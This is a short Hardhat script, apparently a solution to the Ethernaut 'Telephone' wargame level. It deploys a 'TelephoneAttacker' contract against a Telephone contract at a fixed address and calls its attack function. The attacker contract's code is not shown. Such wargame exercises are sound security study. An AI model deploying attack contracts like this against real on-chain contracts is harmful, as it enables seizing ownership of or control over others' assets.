import { ethers } from "hardhat";

async function main() {
  const telephone = await ethers.getContractAt("Telephone", "0x14e62f635f302c54312b59C4b968e6F8084F5a2d");

  const Attacker = await ethers.getContractFactory("TelephoneAttacker");
  const attacker = await Attacker.deploy(telephone.address);
  console.log("attacker deployed at", attacker.address);

  const tx = await attacker.attack();
  await tx.wait(1);

  console.log("done!");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
